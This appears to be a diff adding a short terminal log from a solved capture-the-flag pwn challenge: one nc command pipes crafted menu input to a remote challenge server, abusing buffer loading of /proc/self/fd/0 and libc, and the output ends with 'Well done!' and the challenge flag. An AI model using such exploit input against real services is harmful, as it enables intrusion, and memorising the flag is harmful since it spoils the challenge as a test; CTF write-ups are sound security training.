@@ -1,0 +1,14 @@
+$ echo "1\n/proc/self/fd/0\n1\n/lib/x86_64-linux-gnu/libc.so.6\n2\n1\n0\n" | nc 52.231.220.191 5001
+1. Create new buffer and load file content
+2. Copy some buffer to another
+3. Exit
+Enter command: Enter file name: Read -1 bytes from /proc/self/fd/0
+1. Create new buffer and load file content
+2. Copy some buffer to another
+3. Exit
+Enter command: Enter file name: Read 2125328 bytes from /lib/x86_64-linux-gnu/libc.so.6
+1. Create new buffer and load file content
+2. Copy some buffer to another
+3. Exit
+Enter command: Enter source index: Enter destination index: Well done!
+IERAE{7h3_f1rs7_s73p_7o_b3_4_pwn3r_51a7806b}
